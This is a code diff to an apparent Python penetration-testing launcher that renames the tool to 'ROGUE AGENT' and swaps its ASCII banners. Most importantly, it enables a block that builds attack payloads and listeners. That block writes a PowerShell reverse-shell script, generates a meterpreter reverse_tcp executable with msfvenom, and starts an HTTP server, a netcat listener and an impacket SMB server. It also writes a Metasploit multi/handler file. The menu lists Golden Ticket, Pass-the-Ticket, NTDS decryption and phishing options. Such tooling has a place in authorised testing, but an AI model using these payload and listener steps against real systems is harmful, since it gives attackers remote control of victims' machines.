@@ -188,52 +188,29 @@ def keys():
    
 def banner1():
    with open("banner.tmp", "w") as banner:
-      banner.write("\t\t__        _____ _   _   __  __    _    ____ _____ _____ ____    \n")
-      banner.write("\t\t\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \   \n")
-      banner.write("\t\t \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |  \n")
-      banner.write("\t\t  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <   \n")
-      banner.write("\t\t   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\  \n")
-      banner.write("\t\t                                                                \n")
-      banner.write("\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      \n")
-      banner.write("\t\t                                                                \n")
+   
+      banner.write("\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   \n")
+      banner.write("\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  \n")
+      banner.write("\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    \n")
+      banner.write("\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    \n")
+      banner.write("\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|    \n")
+      banner.write("\t\t                                                                  \n")
+      banner.write("\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)        \n")
+      banner.write("\t\t                                                                  \n")
    return
    
 def banner2():
    with open("banner.tmp", "w") as banner:
-      banner.write("\t\t__        _____ _   _    _   _ _____ _____ ____    ____  _____ ______     _______ ____   \n")
-      banner.write("\t\t\ \      / /_ _| \ | |  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
-      banner.write("\t\t \ \ /\ / / | ||  \| |  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
-      banner.write("\t\t  \ V  V /  | || |\  |  |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  \n")
-      banner.write("\t\t   \_/\_/  |___|_| \_|  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
-      banner.write("\t\t                                                                                         \n")
-      banner.write("\t\t                  BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                  \n")
-      banner.write("                                                                                             \n")
+      banner.write("\t\t _   _ _____ _____ ____    ____  _____ ______     _______ ____   \n")
+      banner.write("\t\t| | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
+      banner.write("\t\t| |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
+      banner.write("\t\t|  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  \n")
+      banner.write("\t\t|_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
+      banner.write("\t\t                                                                 \n")
+      banner.write("\t\t      BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)      \n")
+      banner.write("                                                                     \n")
    return
-     
-def banner3():
-   with open("banner.tmp", "w") as banner:
-      banner.write("\t\t__        _____ _   _   ____  __  __ ____    ____  _____ ______     _______ ____   \n") 
-      banner.write("\t\t\ \      / /_ _| \ | | / ___||  \/  | __ )  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
-      banner.write("\t\t \ \ /\ / / | ||  \| | \___ \| |\/| |  _ \  \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
-      banner.write("\t\t  \ V  V /  | || |\  |  ___) | |  | | |_) |  ___) | |___|  _ < \ V / | |___|  _ <  \n")
-      banner.write("\t\t   \_/\_/  |___|_| \_| |____/|_|  |_|____/  |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
-      banner.write("\t\t                                                                                   \n")
-      banner.write("\t\t                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)              \n")
-      banner.write("                                                                                       \n")
-   return
-
-def banner4():
-   with open("banner.tmp", "w") as banner:
-      banner.write("\t\t__        _____ _   _   __  __ _____ _____ _____ ____  ____  ____  _____ _____ _____ ____   \n")
-      banner.write("\t\t\ \      / /_ _| \ | | |  \/  | ____|_   _| ____|  _ \|  _ \|  _ \| ____|_   _| ____|  _ \  \n")
-      banner.write("\t\t \ \ /\ / / | ||  \| | | |\/| |  _|   | | |  _| | |_) | |_) | |_) |  _|   | | |  _| | |_) | \n")
-      banner.write("\t\t  \ V  V /  | || |\  | | |  | | |___  | | | |___|  _ <|  __/|  _ <| |___  | | | |___|  _ <  \n") 
-      banner.write("\t\t   \_/\_/  |___|_| \_| |_|  |_|_____| |_| |_____|_| \_\_|   |_| \_\_____| |_| |_____|_| \_\ \n")
-      banner.write("\t\t                                                                                            \n")
-      banner.write("\t\t                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                       \n")
-      banner.write("                                                                                                \n")
-   return
-
+   
 def submenu():
    with open("banner.tmp", "w")  as banner:
       banner.write("                                                                                                                                                         \n")
@@ -248,7 +225,30 @@ def submenu():
       banner.write("nmapsetup.exe                                                                                                               mimikatz32.exe               \n")
       banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
    return
-   
+     
+def banner3():
+   with open("banner.tmp", "w") as banner:
+      banner.write("\t\t ____  __  __ ____    ____  _____ ______     _______ ____   \n") 
+      banner.write("\t\t/ ___||  \/  | __ )  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
+      banner.write("\t\t\___ \| |\/| |  _ \  \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
+      banner.write("\t\t ___) | |  | | |_) |  ___) | |___|  _ < \ V / | |___|  _ <  \n")
+      banner.write("\t\t|____/|_|  |_|____/  |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
+      banner.write("\t\t                                                            \n")
+      banner.write("\t\t   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)    \n")
+      banner.write("                                                                \n")
+   return
+
+def banner4():
+   with open("banner.tmp", "w") as banner:
+      banner.write("\t\t __  __ _____ _____ _____ ____  ____  ____  _____ _____ _____ ____   \n")
+      banner.write("\t\t|  \/  | ____|_   _| ____|  _ \|  _ \|  _ \| ____|_   _| ____|  _ \  \n")
+      banner.write("\t\t| |\/| |  _|   | | |  _| | |_) | |_) | |_) |  _|   | | |  _| | |_) | \n")
+      banner.write("\t\t| |  | | |___  | | | |___|  _ <|  __/|  _ <| |___  | | | |___|  _ <  \n") 
+      banner.write("\t\t|_|  |_|_____| |_| |_____|_| \_\_|   |_| \_\_____| |_| |_____|_| \_\ \n")
+      banner.write("\t\t                                                                     \n")
+      banner.write("\t\t       BY TER ENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)        \n")
+      banner.write("                                                                         \n")
+   return   
    
 def checkInterface(variable):
    print("[" + colored("*", colour8) + "] Checking network interface...\n")
@@ -520,7 +520,7 @@ def display():
    
 # -------------------------------------------------------------------------------------
 
-#   print('\u2551' + " WORK FOLDER  " + '\u2551', end=' ')
+#  print('\u2551' + " WORK FOLDER  " + '\u2551', end=' ')
 #   if DIR.rstrip(" ") == workDir:
 #      print(colored(DIR[:COL1],colour7), end=' ')
 #   else:
@@ -562,7 +562,7 @@ def options():
    print('\u2551' + "(08) Re/Set DOMAIN NAME (20)                    (27) WmiExec (37) SmbMap SHARE   (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL  " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN SID  (21)                    (28) IfMap   (38) SmbCopy Files  (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm  " + '\u2551')
    print('\u2551' + "(10) Re/Set SHARE NAME  (22)                    (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89)        " + '\u2551')
-   print('\u2551' + "(11) Re/Set SERVER TIME (23)                    (  )         (  )                (  )                (  )             (  )             (  )            (  )        " + '\u2551')
+   print('\u2551' + "(11) Re/Set SERVER TIME (23)                    (  )         (  )                (  )                (  )             (  )             (  )            (90)        " + '\u2551')
    print('\u2551' + "(12) Re/Set             (24)                    (  )         (  )                (  )                (  )             (  )             (  )            (91) Exit   " + '\u2661')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
@@ -576,7 +576,7 @@ def options():
 # -------------------------------------------------------------------------------------
 
 command("clear")
-command("xdotool key Alt+Shift+S; xdotool type 'WIN MASTER'; xdotool key Return")
+command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
 banner1()
 command("cat banner.tmp")
 
@@ -728,87 +728,85 @@ if":" in TIP:
 else:
    IP46 = "-4"
    
-"""	# -------------------------------------------------------------------------------------
-	# AUTHOR  : Terence Broadbent                                                    
-	# CONTRACT: GitHub                                                               
-	# Version : TREADSTONE                                                             
-	# Details : Set up local exploit files.
-	# Modified: N/A                                                               	
-	# -------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Set up local exploit files.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
 
-	print("[" + colored("*", colour8) + "] Creating exploit files...")
-	command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
-	command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
-	command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/meterpreter.exe  > /dev/null 2>&1")
+print("[" + colored("*", colour8) + "] Creating exploit files...")
+command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
+command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
+command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/meterpreter.exe  > /dev/null 2>&1")
 
-	# -------------------------------------------------------------------------------------
-	# AUTHOR  : Terence Broadbent                                                    
-	# CONTRACT: GitHub                                                               
-	# Version : TREADSTONE                                                             
-	# Details : Start HTTP server.
-	# Modified: N/A                                                               	
-	# -------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start HTTP server.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
 
-	print("[" + colored("*", colour8) + "] Starting HTTP server...")
-	time.sleep(2)
-	banner2()
+print("[" + colored("*", colour8) + "] Starting HTTP server...")
+time.sleep(2)
+banner2()
 
-	command("xdotool key Ctrl+Shift+T; sleep 2")
-	command("xdotool key Alt+Shift+S; xdotool type 'WIN HTTP SERVER'; xdotool key Return; sleep 2")
-	command("xdotool type 'cat banner.tmp'; xdotool key Return")
-	submenu()
-	command("xdotool type 'cat banner.tmp'; xdotool key Return")
-	command("xdotool type 'python3 -m http.server 80'; xdotool key Return; sleep 2")
-	command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return; sleep 2")
-	command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool key Ctrl+Shift+T; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 2")
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
+submenu()
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
+command("xdotool type 'python3 -m http.server 80'; xdotool key Return; sleep 2")
+command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return; sleep 2")
+command("xdotool key Ctrl+Shift+Tab; sleep 2")
 
-	# -------------------------------------------------------------------------------------
-	# AUTHOR  : Terence Broadbent                                                    
-	# CONTRACT: GitHub                                                               
-	# Version : TREADSTONE                                                             
-	# Details : Start SMB server.
-	# Modified: N/A                                                               	
-	# -------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start SMB server.
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
 
-	print("[" + colored("*", colour8) + "] Starting SMB server...")
-	banner3()
-	time.sleep(2)
+print("[" + colored("*", colour8) + "] Starting SMB server...")
+banner3()
+time.sleep(2)
 
-	command("xdotool key Ctrl+Shift+T; sleep 2")
-	command("xdotool key Alt+Shift+S; xdotool type 'WIN SMB Server'; xdotool key Return; sleep 2")
-	command("xdotool type 'cat banner.tmp'; xdotool key Return")
-	command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
-	command("xdotool key Ctrl+Shift+Tab; sleep 2")
-	command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool key Ctrl+Shift+T; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'SMB Server'; xdotool key Return; sleep 2")
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
+command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
+command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool key Ctrl+Shift+Tab; sleep 2")
 
-	# -------------------------------------------------------------------------------------
-	# AUTHOR  : Terence Broadbent                                                    
-	# CONTRACT: GitHub                                                               
-	# Version : TREADSTONE                                                             
-	# Details : Start metersploit server
-	# Modified: N/A                                                               	
-	# -------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : TREADSTONE                                                             
+# Details : Start metersploit server
+# Modified: N/A                                                               	
+# -------------------------------------------------------------------------------------
 
-	print("[" + colored("*", colour8) + "] Starting metasploit server...")
-	banner4()
-	time.sleep(2)
+print("[" + colored("*", colour8) + "] Starting metasploit server...")
+banner4()
+time.sleep(2)
 
-	with open("meterpreter.rc", "w") as write:
-	   write.write("use exploit/multi/handler\n")
-	   write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
-	   write.write("set LHOST " + localIP + "\n")
-	   write.write("run\n")
+with open("meterpreter.rc", "w") as write:
+   write.write("use exploit/multi/handler\n")
+   write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
+   write.write("set LHOST " + localIP + "\n")
+   write.write("run\n")
 
-	command("xdotool key Ctrl+Shift+T; sleep 2")
-	command("xdotool key Alt+Shift+S; xdotool type 'WIN METERPRETER'; xdotool key Return; sleep 2")
-	command("xdotool type 'cat banner.tmp'; xdotool key Return")
-	command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-	command("xdotool key Ctrl+Shift+Tab; sleep 2")
-	command("xdotool key Ctrl+Shift+Tab; sleep 2")
-	command("xdotool key Ctrl+Shift+Tab; sleep 2")
-	time.sleep(5)
-
-"""
+command("xdotool key Ctrl+Shift+T; sleep 2")
+command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER'; xdotool key Return; sleep 2")
+command("xdotool type 'cat banner.tmp'; xdotool key Return")
+command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
+command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool key Ctrl+Shift+Tab; sleep 2")
+command("xdotool key Ctrl+Shift+Tab; sleep 2")
+time.sleep(5)
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
